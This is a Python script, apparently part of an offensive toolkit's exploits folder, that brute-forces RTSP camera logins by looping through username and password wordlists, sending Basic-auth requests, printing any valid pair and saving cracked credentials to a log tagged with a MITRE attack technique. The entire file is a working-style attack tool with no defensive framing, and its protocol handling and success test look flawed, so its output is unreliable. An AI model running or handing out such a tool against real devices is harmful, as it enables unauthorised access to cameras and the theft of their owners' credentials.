# modules/exploits/rtsp_auth_bruteforcer.py

import requests
import argparse
import base64
from datetime import datetime
import os
import json

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1110"

def log_brute(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def brute_force_rtsp(url, userlist, passlist):
    found = None
    with open(userlist, "r") as ufile:
        users = [u.strip() for u in ufile.readlines()]
    with open(passlist, "r") as pfile:
        passes = [p.strip() for p in pfile.readlines()]

    for user in users:
        for pwd in passes:
            auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
            headers = {
                "Authorization": f"Basic {auth}",
                "CSeq": "2"
            }
            try:
                resp = requests.options(url, headers=headers, timeout=3)
                if resp.status_code in [200, 401] and "WWW-Authenticate" not in resp.headers:
                    print(f"[âœ“] Valid credentials: {user}:{pwd}")
                    found = (user, pwd)
                    break
            except Exception:
                pass
        if found:
            break

    log_brute({
        "timestamp": datetime.utcnow().isoformat(),
        "url": url,
        "success": found is not None,
        "user": found[0] if found else None,
        "pass": found[1] if found else None,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="RTSP Credential Brute-Forcer")
    parser.add_argument("--url", required=True, help="RTSP URL (e.g., rtsp://IP:554/stream)")
    parser.add_argument("--userlist", required=True, help="Path to user wordlist")
    parser.add_argument("--passlist", required=True, help="Path to password wordlist")
    args = parser.parse_args()

    brute_force_rtsp(args.url, args.userlist, args.passlist)
